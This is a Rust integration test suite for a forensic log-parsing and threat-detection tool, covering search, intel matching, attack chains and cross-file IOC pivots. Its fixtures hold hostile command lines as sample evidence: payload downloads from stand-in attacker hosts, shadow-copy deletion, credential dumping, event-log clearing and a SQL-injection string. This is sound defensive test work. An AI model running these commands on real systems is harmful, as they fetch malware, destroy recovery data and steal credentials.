//! DFIR / SOC Analyst End-to-End Evaluation Suite
use log_parser_lib::commands::{
    cross_ioc_overlap, cross_search_files, export_ioc_overlap_file, FileTarget,
};
use log_parser_lib::db::{self, ColumnMeta};
use log_parser_lib::header_utils;
use log_parser_lib::intel::chains::compute_chains;
use log_parser_lib::intel::matcher::scan_connection_with_options;
use log_parser_lib::intel::roles::detect_column_roles;
use log_parser_lib::query::{
    count_rows, query_rows, ColumnFilter, FilterOp, QueryExpression, QuerySpec,
};
use std::collections::HashSet;
use std::path::PathBuf;

fn temp_db_path(name: &str) -> PathBuf {
    let mut p = std::env::temp_dir();
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    p.push(format!("log-parser-eval-{name}-{ts}.sqlite3"));
    let _ = std::fs::remove_file(&p);
    p
}

#[test]
fn test_evidence_grid_filtering_and_clear_reset() {
    let db_path = temp_db_path("grid-filter");
    let conn = db::open(&db_path).unwrap();

    let raw_headers = vec![
        "TimeGenerated".to_string(),
        "Account".to_string(),
        "Computer".to_string(),
        "CommandLine".to_string(),
        "EventID".to_string(),
    ];
    let cols = header_utils::sanitize_headers(&raw_headers);
    db::create_schema(&conn, &cols).unwrap();

    for i in 1..=100 {
        let account = if i % 10 == 0 { "admin_user" } else if i % 2 == 0 { "alice" } else { "bob" };
        let cmd = if i == 42 {
            "powershell.exe -enc SQBFAFgA"
        } else if i == 88 {
            "certutil -urlcache -split -f http://198.51.100.22/evil.exe"
        } else {
            "svchost.exe -k netsvcs"
        };
        let event_id = if i % 5 == 0 { 4625 } else { 4624 };

        conn.execute(
            "INSERT INTO rows (row_num, timegenerated, account, computer, commandline, eventid)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            rusqlite::params![
                i as i64,
                format!("2026-01-01T12:{:02}:00Z", i % 60),
                account,
                format!("WORKSTATION-{:02}", i % 10),
                cmd,
                event_id,
            ],
        )
        .unwrap();
    }
    db::populate_fts(&conn, &cols).unwrap();

    let baseline_spec = QuerySpec::default();
    assert_eq!(count_rows(&conn, &cols, &baseline_spec).unwrap(), 100);

    let fts_spec = QuerySpec {
        search: Some("powershell".to_string()),
        ..QuerySpec::default()
    };
    let fts_page = query_rows(&conn, &cols, &fts_spec).unwrap();
    assert_eq!(fts_page.rows.len(), 1);
    assert_eq!(fts_page.rows[0]["row_num"], serde_json::json!(42));
    assert_eq!(count_rows(&conn, &cols, &fts_spec).unwrap(), 1);

    let filter_spec = QuerySpec {
        filters: vec![ColumnFilter {
            column: "account".to_string(),
            op: FilterOp::Equals,
            value: "admin_user".to_string(),
        }],
        ..QuerySpec::default()
    };
    assert_eq!(count_rows(&conn, &cols, &filter_spec).unwrap(), 10);

    let chain_spec = QuerySpec {
        expression: Some(QueryExpression::RowIds {
            values: vec![42, 88],
        }),
        ..QuerySpec::default()
    };
    let chain_page = query_rows(&conn, &cols, &chain_spec).unwrap();
    assert_eq!(chain_page.rows.len(), 2);
    let returned_ids: HashSet<i64> = chain_page
        .rows
        .iter()
        .map(|r| r["row_num"].as_i64().unwrap())
        .collect();
    assert!(returned_ids.contains(&42));
    assert!(returned_ids.contains(&88));

    let reset_spec = QuerySpec::default();
    let reset_page = query_rows(&conn, &cols, &reset_spec).unwrap();
    assert_eq!(reset_page.rows.len(), 100.min(reset_spec.limit as usize));
    assert_eq!(count_rows(&conn, &cols, &reset_spec).unwrap(), 100);
}

#[test]
fn test_threat_enrichment_on_diverse_and_fallback_schemas() {
    let db_path = temp_db_path("enrichment-diverse");
    let mut conn = db::open(&db_path).unwrap();

    let raw_headers = vec![
        "log_stamp".to_string(),
        "custom_host".to_string(),
        "actor_id".to_string(),
        "raw_payload".to_string(),
        "metadata_blob".to_string(),
    ];
    let cols = header_utils::sanitize_headers(&raw_headers);
    db::create_schema(&conn, &cols).unwrap();

    let suggested_roles = detect_column_roles(&conn, &cols).unwrap();
    let has_cmd_role = suggested_roles.iter().any(|r| r.role == "commandline");
    assert!(!has_cmd_role);

    let fallback_cols: Vec<String> = cols
        .iter()
        .map(|c| c.sql_name.clone())
        .filter(|n| n != "row_num")
        .collect();
    assert_eq!(fallback_cols.len(), 5);

    let rows = vec![
        (1, "2026-01-01T10:00:00Z", "SRV-DC01", "operator", "whoami /groups", "recon activity"),
        (2, "2026-01-01T10:05:00Z", "SRV-DC01", "operator", "vssadmin delete shadows /all /quiet", "inhibit recovery"),
        (3, "2026-01-01T10:10:00Z", "SRV-DC01", "operator", "powershell -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAA==", "powershell base64 encoded"),
        (4, "2026-01-01T10:15:00Z", "SRV-DC01", "operator", "rundll32.exe comsvcs.dll MiniDump", "credential dumping"),
        (5, "2026-01-01T10:20:00Z", "SRV-DC01", "operator", "wevtutil cl Security", "clear event logs"),
    ];

    for (row_num, stamp, host, actor, payload, meta) in rows {
        conn.execute(
            "INSERT INTO rows (row_num, log_stamp, custom_host, actor_id, raw_payload, metadata_blob)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            rusqlite::params![row_num, stamp, host, actor, payload, meta],
        )
        .unwrap();
    }

    let summary = scan_connection_with_options(&mut conn, &fallback_cols, true, |_, _, _| {}).unwrap();

    assert_eq!(summary.rows_scanned, 5);
    assert!(summary.match_count >= 4);
    assert!(summary.matched_rows >= 4);

    let chains = compute_chains(&conn, "_intel_match").unwrap();
    assert!(!chains.is_empty());
    let chain = &chains[0];
    assert!(chain.tactic_count >= 3);
    assert_eq!(chain.row_count, 5);
}

#[test]
fn test_multi_file_correlation_global_pivot_and_exports() {
    tauri::async_runtime::block_on(async {
        let db1_path = temp_db_path("cross-fw");
        let db2_path = temp_db_path("cross-edr");
        let db3_path = temp_db_path("cross-ual");

        let shared_ip = "198.51.100.88";
        let shared_user = "compromised_alice";
        let shared_domain = "c2-domain-attacker.com";

        let cols1 = vec![
            ColumnMeta { sql_name: "src_ip".into(), original_name: "SrcIP".into(), col_index: 0, inferred_type: "ip".into() },
            ColumnMeta { sql_name: "dst_ip".into(), original_name: "DstIP".into(), col_index: 1, inferred_type: "ip".into() },
            ColumnMeta { sql_name: "action".into(), original_name: "Action".into(), col_index: 2, inferred_type: "text".into() },
        ];
        {
            let conn1 = db::open(&db1_path).unwrap();
            db::create_schema(&conn1, &cols1).unwrap();
            conn1.execute("INSERT INTO rows (row_num, src_ip, dst_ip, action) VALUES (1, ?1, '10.0.0.10', 'ALLOW')", [shared_ip]).unwrap();
            conn1.execute("INSERT INTO rows (row_num, src_ip, dst_ip, action) VALUES (2, '203.0.113.15', '10.0.0.12', 'BLOCK')", []).unwrap();
            db::populate_fts(&conn1, &cols1).unwrap();
        }

        let cols2 = vec![
            ColumnMeta { sql_name: "user_name".into(), original_name: "UserName".into(), col_index: 0, inferred_type: "text".into() },
            ColumnMeta { sql_name: "cmd_line".into(), original_name: "CommandLine".into(), col_index: 1, inferred_type: "text".into() },
        ];
        {
            let conn2 = db::open(&db2_path).unwrap();
            db::create_schema(&conn2, &cols2).unwrap();
            conn2.execute(
                "INSERT INTO rows (row_num, user_name, cmd_line) VALUES (1, ?1, ?2)",
                rusqlite::params![shared_user, format!("curl http://{shared_domain}/stage2.ps1 -OutFile p.ps1")],
            ).unwrap();
            conn2.execute("INSERT INTO rows (row_num, user_name, cmd_line) VALUES (2, 'clean_bob', 'calc.exe')", []).unwrap();
            db::populate_fts(&conn2, &cols2).unwrap();
        }

        let cols3 = vec![
            ColumnMeta { sql_name: "user_id".into(), original_name: "UserId".into(), col_index: 0, inferred_type: "text".into() },
            ColumnMeta { sql_name: "client_ip".into(), original_name: "ClientIP".into(), col_index: 1, inferred_type: "ip".into() },
            ColumnMeta { sql_name: "operation".into(), original_name: "Operation".into(), col_index: 2, inferred_type: "text".into() },
        ];
        {
            let conn3 = db::open(&db3_path).unwrap();
            db::create_schema(&conn3, &cols3).unwrap();
            conn3.execute(
                "INSERT INTO rows (row_num, user_id, client_ip, operation) VALUES (1, ?1, ?2, 'UserLoggedIn')",
                rusqlite::params![shared_user, shared_ip],
            ).unwrap();
            conn3.execute(
                "INSERT INTO rows (row_num, user_id, client_ip, operation) VALUES (2, ?1, ?2, 'MailItemsAccessed')",
                rusqlite::params![shared_user, shared_ip],
            ).unwrap();
            db::populate_fts(&conn3, &cols3).unwrap();
        }

        let files = vec![
            FileTarget {
                path: "firewall.csv".into(),
                sheet: None,
                cache_db_path: Some(db1_path.to_string_lossy().into()),
            },
            FileTarget {
                path: "edr_events.xlsx".into(),
                sheet: None,
                cache_db_path: Some(db2_path.to_string_lossy().into()),
            },
            FileTarget {
                path: "m365_ual.csv".into(),
                sheet: None,
                cache_db_path: Some(db3_path.to_string_lossy().into()),
            },
        ];

        let ip_pivot = cross_search_files(files.clone(), shared_ip.into()).await.unwrap();
        assert_eq!(ip_pivot.len(), 3);
        assert_eq!(ip_pivot[0].match_count, 1);
        assert_eq!(ip_pivot[1].match_count, 0);
        assert_eq!(ip_pivot[2].match_count, 2);

        let user_pivot = cross_search_files(files.clone(), shared_user.into()).await.unwrap();
        assert_eq!(user_pivot.len(), 3);
        assert_eq!(user_pivot[0].match_count, 0);
        assert_eq!(user_pivot[1].match_count, 1);
        assert_eq!(user_pivot[2].match_count, 2);

        let ioc_overlap = cross_ioc_overlap(files.clone()).await.unwrap();
        assert_eq!(ioc_overlap.files_scanned, 3);
        assert!(ioc_overlap.overlapping_count >= 1);

        let overlap_ip = ioc_overlap.items.iter().find(|i| i.value == shared_ip).expect("shared IP must be found");
        assert_eq!(overlap_ip.file_count, 2);
        assert_eq!(overlap_ip.total_count, 3);

        let domain_item = ioc_overlap.items.iter().find(|i| i.value == shared_domain).expect("domain must be extracted");
        assert_eq!(domain_item.file_count, 1);

        let export_dir = std::env::temp_dir().join(format!("log-parser-export-{}", std::process::id()));
        std::fs::create_dir_all(&export_dir).unwrap();

        let json_dest = export_dir.join("overlap.json");
        let csv_dest = export_dir.join("overlap.csv");
        let xlsx_dest = export_dir.join("overlap.xlsx");

        let json_count = export_ioc_overlap_file(json_dest.to_string_lossy().into(), ioc_overlap.items.clone()).await.unwrap();
        assert_eq!(json_count, ioc_overlap.items.len());
        assert!(json_dest.exists());
        let json_content = std::fs::read_to_string(&json_dest).unwrap();
        assert!(json_content.contains(shared_ip));

        let csv_count = export_ioc_overlap_file(csv_dest.to_string_lossy().into(), ioc_overlap.items.clone()).await.unwrap();
        assert_eq!(csv_count, ioc_overlap.items.len());
        assert!(csv_dest.exists());
        let csv_content = std::fs::read_to_string(&csv_dest).unwrap();
        assert!(csv_content.contains("Type,Indicator Value,File Count"));
        assert!(csv_content.contains(shared_ip));

        let xlsx_count = export_ioc_overlap_file(xlsx_dest.to_string_lossy().into(), ioc_overlap.items.clone()).await.unwrap();
        assert_eq!(xlsx_count, ioc_overlap.items.len());
        assert!(xlsx_dest.exists());
        assert!(std::fs::metadata(&xlsx_dest).unwrap().len() > 1000);
    });
}

#[test]
fn test_edge_cases_wide_files_missing_headers_special_characters_pagination() {
    let db_path = temp_db_path("edge-cases");
    let conn = db::open(&db_path).unwrap();

    let mut raw_headers = Vec::with_capacity(500);
    raw_headers.push("".to_string());
    raw_headers.push("   ".to_string());
    raw_headers.push("TimeGenerated".to_string());
    raw_headers.push("TimeGenerated".to_string());
    raw_headers.push("row_num".to_string());

    for i in 6..=500 {
        raw_headers.push(format!("Special-Col #{i} / metric"));
    }

    let cols = header_utils::sanitize_headers(&raw_headers);
    assert_eq!(cols.len(), 500);
    assert_eq!(cols[0].sql_name, "column_0");
    assert_eq!(cols[1].sql_name, "column_1");
    assert_eq!(cols[2].sql_name, "timegenerated");
    assert_eq!(cols[3].sql_name, "timegenerated_2");
    assert_eq!(cols[4].sql_name, "row_num_2");

    let unique_names: HashSet<String> = cols.iter().map(|c| c.sql_name.clone()).collect();
    assert_eq!(unique_names.len(), 500);

    db::create_schema(&conn, &cols).unwrap();

    for r in 1..=750 {
        conn.execute(
            "INSERT INTO rows (row_num, column_0, timegenerated) VALUES (?1, ?2, ?3)",
            rusqlite::params![
                r as i64,
                if r == 350 { "SPECIAL_TEST_VALUE_350" } else { "normal_value" },
                format!("2026-01-01T{:02}:{:02}:{:02}Z", (r / 3600) % 24, (r / 60) % 60, r % 60),
            ],
        ).unwrap();
    }
    db::populate_fts(&conn, &cols).unwrap();

    assert_eq!(count_rows(&conn, &cols, &QuerySpec::default()).unwrap(), 750);

    let page1_spec = QuerySpec {
        limit: 300,
        ..QuerySpec::default()
    };
    let page1 = query_rows(&conn, &cols, &page1_spec).unwrap();
    assert_eq!(page1.rows.len(), 300);
    assert_eq!(page1.rows[0]["row_num"], serde_json::json!(1));
    assert_eq!(page1.rows[299]["row_num"], serde_json::json!(300));
    let cursor1 = page1.next_cursor.expect("must have cursor for page 2");

    let page2_spec = QuerySpec {
        cursor: Some(cursor1),
        limit: 300,
        ..QuerySpec::default()
    };
    let page2 = query_rows(&conn, &cols, &page2_spec).unwrap();
    assert_eq!(page2.rows.len(), 300);
    assert_eq!(page2.rows[0]["row_num"], serde_json::json!(301));
    assert_eq!(page2.rows[299]["row_num"], serde_json::json!(600));
    let cursor2 = page2.next_cursor.expect("must have cursor for page 3");

    let page3_spec = QuerySpec {
        cursor: Some(cursor2),
        limit: 300,
        ..QuerySpec::default()
    };
    let page3 = query_rows(&conn, &cols, &page3_spec).unwrap();
    assert_eq!(page3.rows.len(), 150);
    assert_eq!(page3.rows[0]["row_num"], serde_json::json!(601));
    assert_eq!(page3.rows[149]["row_num"], serde_json::json!(750));
    assert!(page3.next_cursor.is_none());

    let bad_queries = vec![
        "\"",
        "\"\"\"",
        "*",
        "**",
        "\\",
        "C:\\Windows\\System32\\",
        "(",
        ")",
        "AND OR NOT",
        "[a-z]+",
        "{bad:json}",
        "'; DROP TABLE rows; --",
        "http://",
        "foo*",
    ];

    for q in bad_queries {
        let test_spec = QuerySpec {
            search: Some(q.to_string()),
            ..QuerySpec::default()
        };
        let res = query_rows(&conn, &cols, &test_spec);
        assert!(res.is_ok(), "query_rows failed on raw query: {q} -> {:?}", res.err());
        let count_res = count_rows(&conn, &cols, &test_spec);
        assert!(count_res.is_ok(), "count_rows failed on raw query: {q} -> {:?}", count_res.err());
    }
}
